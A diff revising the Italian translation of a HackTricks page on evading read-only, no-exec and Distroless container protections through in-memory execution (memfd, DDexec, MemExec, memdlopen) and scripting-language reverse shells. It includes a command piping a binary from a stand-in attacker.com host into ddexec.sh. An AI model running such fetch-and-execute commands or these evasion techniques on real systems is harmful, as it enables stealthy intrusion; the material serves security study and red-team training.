@@ -1,4 +1,4 @@
-# Bypass FS protections: read-only / no-exec / Distroless
+# Bypass delle protezioni del file system: sola lettura / no-exec / Distroless
 
 <details>
 
@@ -6,17 +6,17 @@
 
 Altri modi per supportare HackTricks:
 
-* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
+* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
 * Ottieni il [**merchandising ufficiale PEASS & HackTricks**](https://peass.creator-spring.com)
-* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione esclusiva di [**NFT**](https://opensea.io/collection/the-peass-family)
+* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
 * **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repository di Github.
 
 </details>
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-Se sei interessato alla **carriera di hacking** e vuoi hackerare l'inviolabile - **stiamo assumendo!** (_richiesta competenza polacca scritta e parlata_).
+Se sei interessato alla **carriera nell'hacking** e vuoi hackerare l'inviolabile - **stiamo assumendo!** (_richiesta competenza polacca scritta e parlata_).
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
@@ -27,7 +27,7 @@ Nei seguenti video puoi trovare le tecniche menzionate in questa pagina spiegate
 * [**DEF CON 31 - Esplorazione della manipolazione della memoria Linux per furtività ed evasione**](https://www.youtube.com/watch?v=poHirez8jk4)
 * [**Intrusioni furtive con DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)
 
-## Scenario sola lettura / no-exec
+## Scenario di sola lettura / no-exec
 
 È sempre più comune trovare macchine Linux montate con **protezione del file system in sola lettura (ro)**, specialmente nei container. Questo perché eseguire un container con file system in sola lettura è semplice come impostare **`readOnlyRootFilesystem: true`** nel `securitycontext`:
 
@@ -47,14 +47,14 @@ securityContext:
 Tuttavia, anche se il file system è montato come ro, **`/dev/shm`** sarà comunque scrivibile, quindi è falso che non possiamo scrivere nulla sul disco. Tuttavia, questa cartella sarà **montata con protezione no-exec**, quindi se scarichi un binario qui **non potrai eseguirlo**.
 
 {% hint style="warning" %}
-Dal punto di vista di un red team, questo rende **complicato scaricare ed eseguire** binari che non sono già nel sistema (come backdoor o enumeratori come `kubectl`).
+Dal punto di vista di un red team, questo rende **complicato scaricare ed eseguire** binari che non sono già nel sistema (come backdoor o enumerator come `kubectl`).
 {% endhint %}
 
 ## Bypass più semplice: Script
 
 Nota che ho menzionato binari, puoi **eseguire qualsiasi script** purché l'interprete sia presente nella macchina, come uno **script shell** se è presente `sh` o uno **script python** se è installato `python`.
 
-Tuttavia, questo non è sufficiente per eseguire il tuo backdoor binario o altri strumenti binari che potresti aver bisogno di eseguire.
+Tuttavia, questo non è sufficiente per eseguire la tua backdoor binaria o altri strumenti binari che potresti aver bisogno di eseguire.
 
 ## Bypass di memoria
 
@@ -62,14 +62,14 @@ Se vuoi eseguire un binario ma il file system non lo permette, il modo migliore 
 
 ### Bypass syscall FD + exec
 
-Se hai motori di script potenti all'interno della macchina, come **Python**, **Perl** o **Ruby**, potresti scaricare il binario da eseguire dalla memoria, memorizzarlo in un descrittore di file di memoria (`create_memfd` syscall), che non sarà protetto da tali protezioni e quindi chiamare una **syscall `exec`** indicando il **fd come file da eseguire**.
+Se hai potenti motori di script all'interno della macchina, come **Python**, **Perl** o **Ruby**, potresti scaricare il binario da eseguire dalla memoria, memorizzarlo in un descrittore di file di memoria (`create_memfd` syscall), che non sarà protetto da tali protezioni e quindi chiamare una **syscall `exec`** indicando il **fd come file da eseguire**.
 
 Per fare ciò puoi facilmente utilizzare il progetto [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Puoi passargli un binario e genererà uno script nella lingua indicata con il **binario compresso e codificato in b64** con le istruzioni per **decodificarlo e decomprimerlo** in un **fd** creato chiamando la syscall `create_memfd` e una chiamata alla syscall **exec** per eseguirlo.
 
 {% hint style="warning" %}
 Questo non funziona in altri linguaggi di scripting come PHP o Node perché non hanno un **modo predefinito per chiamare le syscall grezze** da uno script, quindi non è possibile chiamare `create_memfd` per creare il **fd di memoria** per memorizzare il binario.
 
-Inoltre, creare un **fd regolare** con un file in `/dev/shm` non funzionerà, poiché non ti sarà consentito eseguirlo perché si applicherà la **protezione no-exec**.
+Inoltre, creare un **fd regolare** con un file in `/dev/shm` non funzionerà, poiché non ti sarà consentito eseguirlo a causa della **protezione no-exec** che si applicherà.
 {% endhint %}
 
 ### DDexec / EverythingExec
@@ -79,14 +79,12 @@ Inoltre, creare un **fd regolare** con un file in `/dev/shm` non funzionerà, po
 Pertanto, **controllando il codice assembly** che viene eseguito dal processo, puoi scrivere uno **shellcode** e "mutare" il processo per **eseguire qualsiasi codice arbitrario**.
 
 {% hint style="success" %}
-**DDexec / EverythingExec** ti permetterà di caricare ed **eseguire** il tuo **shellcode** o **qualsiasi binario** dalla **memoria**.
+**DDexec / EverythingExec** ti permetterà di caricare ed **eseguire** il tuo **proprio shellcode** o **qualsiasi binario** dalla **memoria**.
 {% endhint %}
-
 ```bash
 # Basic example
 wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
 ```
-
 Per ulteriori informazioni su questa tecnica, controlla su Github o:
 
 {% content-ref url="ddexec.md" %}
@@ -95,9 +93,9 @@ Per ulteriori informazioni su questa tecnica, controlla su Github o:
 
 ### MemExec
 
-[**Memexec**](https://github.com/arget13/memexec) è il passo successivo naturale di DDexec. Si tratta di un **shellcode demonizzato DDexec**, quindi ogni volta che si desidera **eseguire un binario diverso** non è necessario riavviare DDexec, è sufficiente eseguire il codice shell memexec tramite la tecnica DDexec e quindi **comunicare con questo demone per passare nuovi binari da caricare ed eseguire**.
+[**Memexec**](https://github.com/arget13/memexec) è il passo successivo naturale di DDexec. Si tratta di un **shellcode demonizzato di DDexec**, quindi ogni volta che si desidera **eseguire un binario diverso** non è necessario riavviare DDexec, è sufficiente eseguire il codice shell di memexec tramite la tecnica DDexec e quindi **comunicare con questo demone per passare nuovi binari da caricare ed eseguire**.
 
-È possibile trovare un esempio su come utilizzare **memexec per eseguire binari da un reverse shell PHP** in [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).
+Puoi trovare un esempio su come utilizzare **memexec per eseguire binari da un reverse shell PHP** in [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).
 
 ### Memdlopen
 
@@ -119,7 +117,7 @@ In un container Distroless potresti **non trovare nemmeno `sh` o `bash`** per ot
 Pertanto, **non** sarai in grado di ottenere una **shell inversa** o **enumerare** il sistema come fai di solito.
 {% endhint %}
 
-Tuttavia, se il container compromesso sta ad esempio eseguendo un'applicazione web Flask, allora Python è installato e quindi puoi ottenere una **shell inversa Python**. Se sta eseguendo node, puoi ottenere una shell inversa di Node, e lo stesso con la maggior parte dei **linguaggi di scripting**.
+Tuttavia, se il container compromesso sta eseguendo ad esempio un'applicazione web Flask, allora Python è installato e quindi puoi ottenere una **shell inversa Python**. Se sta eseguendo Node, puoi ottenere una shell inversa di Node, e lo stesso con la maggior parte dei **linguaggi di scripting**.
 
 {% hint style="success" %}
 Utilizzando il linguaggio di scripting potresti **enumerare il sistema** sfruttando le capacità del linguaggio.
@@ -133,15 +131,15 @@ Tuttavia, in questo tipo di container queste protezioni di solito esistono, ma p
 
 Puoi trovare **esempi** su come **sfruttare alcune vulnerabilità RCE** per ottenere **shell inverse di linguaggi di scripting** ed eseguire binari dalla memoria in [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
 
-<figure><img src="https://github.com/carlospolop/hacktricks/blob/it/.gitbook/assets/image%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-Se sei interessato a una **carriera nell'hacking** e vuoi hackerare l'inviolabile - **stiamo assumendo!** (_richiesta competenza polacca scritta e parlata_).
+Se sei interessato a una **carriera nell'hacking** e vuoi hackerare l'inviolabile - **stiamo assumendo!** (_richiesta competenza in polacco scritto e parlato_).
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
 <details>
 
-<summary><strong>Impara l'hacking AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Altri modi per supportare HackTricks:
 
